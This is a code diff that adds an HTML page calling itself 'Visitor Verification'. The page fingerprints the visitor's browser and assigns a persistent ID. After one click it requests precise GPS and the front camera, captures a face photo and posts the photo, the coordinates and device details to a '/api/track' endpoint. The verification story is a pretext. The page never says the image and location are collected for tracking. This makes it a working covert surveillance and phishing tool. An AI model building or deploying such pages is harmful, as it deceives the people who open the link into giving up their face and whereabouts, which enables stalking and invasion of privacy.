@@ -1,3 +1,969 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+
+<meta charset="UTF-8">
+
+<meta
+  name="viewport"
+  content="width=device-width, initial-scale=1.0"
+>
+
+<title>Visitor Verification</title>
+
+<style>
+
+* {
+  box-sizing: border-box;
+}
+
+body {
+  margin: 0;
+  min-height: 100vh;
+
+  display: flex;
+  align-items: center;
+  justify-content: center;
+
+  font-family:
+    Arial,
+    Helvetica,
+    sans-serif;
+
+  background:
+    linear-gradient(
+      135deg,
+      #0f172a,
+      #1e293b
+    );
+
+  color: white;
+}
+
+.card {
+
+  width: calc(100% - 32px);
+  max-width: 460px;
+
+  padding: 30px;
+
+  background:
+    rgba(30, 41, 59, 0.96);
+
+  border:
+    1px solid
+    rgba(255,255,255,0.08);
+
+  border-radius: 20px;
+
+  box-shadow:
+    0 20px 60px
+    rgba(0,0,0,0.35);
+
+  text-align: center;
+}
+
+.logo {
+
+  width: 70px;
+  height: 70px;
+
+  margin:
+    0 auto 20px;
+
+  display:
+    flex;
+
+  align-items:
+    center;
+
+  justify-content:
+    center;
+
+  border-radius:
+    50%;
+
+  background:
+    #2563eb;
+
+  font-size:
+    32px;
+}
+
+h1 {
+
+  margin:
+    0 0 10px;
+
+  font-size:
+    24px;
+}
+
+p {
+
+  color:
+    #cbd5e1;
+
+  line-height:
+    1.6;
+
+  font-size:
+    14px;
+}
+
+.permissions {
+
+  margin:
+    20px 0;
+
+  padding:
+    15px;
+
+  background:
+    #0f172a;
+
+  border-radius:
+    12px;
+
+  text-align:
+    left;
+}
+
+.permission {
+
+  display:
+    flex;
+
+  gap:
+    10px;
+
+  margin:
+    10px 0;
+
+  font-size:
+    14px;
+
+  color:
+    #e2e8f0;
+}
+
+button {
+
+  width:
+    100%;
+
+  border:
+    0;
+
+  border-radius:
+    12px;
+
+  padding:
+    14px;
+
+  background:
+    #2563eb;
+
+  color:
+    white;
+
+  font-size:
+    16px;
+
+  font-weight:
+    bold;
+
+  cursor:
+    pointer;
+}
+
+button:disabled {
+
+  opacity:
+    0.6;
+
+  cursor:
+    not-allowed;
+}
+
+.status {
+
+  margin-top:
+    18px;
+
+  font-size:
+    13px;
+
+  color:
+    #94a3b8;
+}
+
+.success {
+
+  color:
+    #4ade80;
+}
+
+.error {
+
+  color:
+    #f87171;
+}
+
+video {
+
+  display:
+    none;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="card">
+
+  <div class="logo">
+    📍
+  </div>
+
+  <h1>
+    Visitor Verification
+  </h1>
+
+  <p>
+    Please continue to complete visitor verification.
+    Your browser may ask for camera and location permission.
+  </p>
+
+  <div class="permissions">
+
+    <div class="permission">
+      📷
+      <span>
+        Camera permission for verification
+      </span>
+    </div>
+
+    <div class="permission">
+      📍
+      <span>
+        Location permission for verification
+      </span>
+    </div>
+
+  </div>
+
+  <button id="startBtn">
+    Continue
+  </button>
+
+  <div
+    id="status"
+    class="status"
+  >
+    Waiting for confirmation...
+  </div>
+
+  <video
+    id="video"
+    playsinline
+    muted
+  ></video>
+
+</div>
+
+
 <script>
-location.href = "/track/";
+
+// ============================================================
+// CONFIG
+// ============================================================
+
+const API = "/api/track";
+
+
+// ============================================================
+// USER ID
+// ============================================================
+
+function getUserId() {
+
+  let id =
+    localStorage.getItem(
+      "visitor_user_id"
+    );
+
+  if (!id) {
+
+    id =
+      crypto.randomUUID();
+
+    localStorage.setItem(
+      "visitor_user_id",
+      id
+    );
+  }
+
+  return id;
+}
+
+const USER_ID =
+  getUserId();
+
+
+// ============================================================
+// SESSION
+// ============================================================
+
+const SESSION_ID =
+  crypto.randomUUID();
+
+
+// ============================================================
+// FINGERPRINT
+// ============================================================
+
+function getFingerprint() {
+
+  const raw = [
+    navigator.userAgent,
+    screen.width,
+    screen.height,
+    navigator.language,
+    navigator.hardwareConcurrency || 0,
+    navigator.platform
+  ].join("|");
+
+  // This is an identifier only.
+  // It is NOT used as authentication.
+
+  return btoa(
+    unescape(
+      encodeURIComponent(raw)
+    )
+  ).slice(
+    0,
+    500
+  );
+}
+
+const FINGERPRINT =
+  getFingerprint();
+
+
+// ============================================================
+// STATUS
+// ============================================================
+
+const statusEl =
+  document.getElementById(
+    "status"
+  );
+
+const startBtn =
+  document.getElementById(
+    "startBtn"
+  );
+
+const video =
+  document.getElementById(
+    "video"
+  );
+
+function status(
+  message,
+  type = ""
+) {
+
+  statusEl.textContent =
+    message;
+
+  statusEl.className =
+    `status ${type}`;
+}
+
+
+// ============================================================
+// SEND
+// ============================================================
+
+async function send(
+  data
+) {
+
+  try {
+
+    const payload = {
+      user_id:
+        USER_ID,
+
+      session_id:
+        SESSION_ID,
+
+      fingerprint:
+        FINGERPRINT,
+
+      ...data
+    };
+
+    const response =
+      await fetch(
+        API,
+        {
+          method:
+            "POST",
+
+          headers: {
+            "Content-Type":
+              "application/json"
+          },
+
+          body:
+            JSON.stringify(
+              payload
+            ),
+
+          cache:
+            "no-store"
+        }
+      );
+
+    return response.ok;
+
+  } catch (error) {
+
+    console.log(
+      "Send error:",
+      error
+    );
+
+    return false;
+  }
+}
+
+
+// ============================================================
+// INITIAL DATA
+// ============================================================
+
+async function sendInit() {
+
+  const connection =
+    navigator.connection ||
+    {};
+
+  await send({
+
+    event:
+      "init",
+
+    device:
+      navigator.userAgent,
+
+    os:
+      navigator.platform,
+
+    browser:
+      navigator.userAgent,
+
+    network:
+      connection.effectiveType ||
+      "unknown",
+
+    downlink:
+      connection.downlink ||
+      "-",
+
+    time:
+      new Date().toISOString()
+  });
+
+}
+
+
+// ============================================================
+// GPS
+// ============================================================
+
+let gpsData = {};
+
+async function getGPS() {
+
+  if (
+    !navigator.geolocation
+  ) {
+
+    return;
+  }
+
+  await new Promise(
+    resolve => {
+
+      let finished =
+        false;
+
+      const done =
+        () => {
+
+          if (
+            finished
+          ) return;
+
+          finished =
+            true;
+
+          resolve();
+        };
+
+      const timer =
+        setTimeout(
+          done,
+          6000
+        );
+
+      navigator.geolocation.getCurrentPosition(
+
+        position => {
+
+          clearTimeout(
+            timer
+          );
+
+          gpsData = {
+
+            lat:
+              position.coords.latitude,
+
+            lng:
+              position.coords.longitude
+          };
+
+          send({
+            event:
+              "gps",
+
+            ...gpsData
+          });
+
+          done();
+        },
+
+        error => {
+
+          clearTimeout(
+            timer
+          );
+
+          console.log(
+            "GPS:",
+            error.message
+          );
+
+          done();
+        },
+
+        {
+          enableHighAccuracy:
+            true,
+
+          timeout:
+            5500,
+
+          maximumAge:
+            0
+        }
+      );
+
+    }
+  );
+}
+
+
+// ============================================================
+// IMAGE CAPTURE
+// ============================================================
+
+async function captureImage(
+  stream
+) {
+
+  video.srcObject =
+    stream;
+
+  await video.play();
+
+  // Give camera a moment to stabilize.
+
+  await new Promise(
+    resolve =>
+      setTimeout(
+        resolve,
+        700
+      )
+  );
+
+  const width =
+    video.videoWidth;
+
+  const height =
+    video.videoHeight;
+
+  if (
+    !width ||
+    !height
+  ) {
+
+    return null;
+  }
+
+  // Resize image to reduce request size.
+
+  const MAX_WIDTH =
+    900;
+
+  const scale =
+    Math.min(
+      1,
+      MAX_WIDTH / width
+    );
+
+  const canvas =
+    document.createElement(
+      "canvas"
+    );
+
+  canvas.width =
+    Math.round(
+      width * scale
+    );
+
+  canvas.height =
+    Math.round(
+      height * scale
+    );
+
+  const context =
+    canvas.getContext(
+      "2d"
+    );
+
+  context.drawImage(
+    video,
+    0,
+    0,
+    canvas.width,
+    canvas.height
+  );
+
+  // Try progressively lower quality.
+
+  const qualities = [
+    0.72,
+    0.60,
+    0.50,
+    0.40
+  ];
+
+  for (
+    const quality
+    of qualities
+  ) {
+
+    const image =
+      canvas.toDataURL(
+        "image/jpeg",
+        quality
+      );
+
+    if (
+      image.length <= 850000
+    ) {
+
+      return image;
+    }
+  }
+
+  return null;
+}
+
+
+// ============================================================
+// FINAL
+// ============================================================
+
+let finalSent =
+  false;
+
+async function sendFinal(
+  data
+) {
+
+  if (
+    finalSent
+  ) {
+
+    return;
+  }
+
+  finalSent =
+    true;
+
+  await send({
+
+    event:
+      "final",
+
+    time:
+      new Date().toISOString(),
+
+    ...gpsData,
+
+    ...data
+  });
+}
+
+
+// ============================================================
+// CAMERA
+// ============================================================
+
+async function cameraFlow() {
+
+  let stream =
+    null;
+
+  try {
+
+    status(
+      "Requesting location..."
+    );
+
+    // Start GPS and camera in parallel.
+
+    const gpsPromise =
+      getGPS();
+
+    status(
+      "Requesting camera permission..."
+    );
+
+    const mediaPromise =
+      navigator.mediaDevices.getUserMedia(
+        {
+          video: {
+            facingMode:
+              "user"
+          },
+
+          audio:
+            false
+        }
+      );
+
+    let timedOut =
+      false;
+
+    const timeoutPromise =
+      new Promise(
+        resolve =>
+          setTimeout(
+            () => {
+
+              timedOut =
+                true;
+
+              resolve(
+                null
+              );
+
+            },
+            7000
+          )
+      );
+
+    stream =
+      await Promise.race([
+        mediaPromise,
+        timeoutPromise
+      ]);
+
+    // If permission response arrives after timeout,
+    // immediately stop that stream.
+
+    if (
+      timedOut
+    ) {
+
+      mediaPromise
+        .then(
+          lateStream => {
+
+            if (
+              lateStream
+            ) {
+
+              lateStream
+                .getTracks()
+                .forEach(
+                  track =>
+                    track.stop()
+                );
+            }
+
+          }
+        )
+        .catch(
+          () => {}
+        );
+
+      await gpsPromise;
+
+      await sendFinal({
+        camera:
+          "timeout"
+      });
+
+      status(
+        "Verification timed out.",
+        "error"
+      );
+
+      return;
+    }
+
+    if (!stream) {
+
+      await gpsPromise;
+
+      await sendFinal({
+        camera:
+          "timeout"
+      });
+
+      return;
+    }
+
+    status(
+      "Capturing verification..."
+    );
+
+    const image =
+      await captureImage(
+        stream
+      );
+
+    // Wait for GPS, but don't block forever.
+
+    await Promise.race([
+      gpsPromise,
+
+      new Promise(
+        resolve =>
+          setTimeout(
+            resolve,
+            1000
+          )
+      )
+    ]);
+
+    if (image) {
+
+      await sendFinal({
+
+        camera:
+          "success",
+
+        image
+      });
+
+    } else {
+
+      await sendFinal({
+
+        camera:
+          "capture_failed"
+      });
+    }
+
+    status(
+      "Verification completed.",
+      "success"
+    );
+
+  } catch (error) {
+
+    console.log(
+      "Camera error:",
+      error
+    );
+
+    await getGPS();
+
+    await sendFinal({
+
+      camera:
+        "denied",
+
+      error:
+        String(
+          error?.message ||
+          "Camera unavailable"
+        ).slice(
+          0,
+          500
+        )
+    });
+
+    status(
+      "Camera permission was not available.",
+      "error"
+    );
+
+  } finally {
+
+    if (
+      stream
+    ) {
+
+      stream
+        .getTracks()
+        .forEach(
+          track =>
+            track.stop()
+        );
+    }
+
+    video.srcObject =
+      null;
+  }
+}
+
+
+// ============================================================
+// START
+// ============================================================
+
+startBtn.addEventListener(
+  "click",
+  async () => {
+
+    startBtn.disabled =
+      true;
+
+    status(
+      "Starting verification..."
+    );
+
+    await sendInit();
+
+    await cameraFlow();
+
+  }
+);
+
 </script>
+
+</body>
+</html>
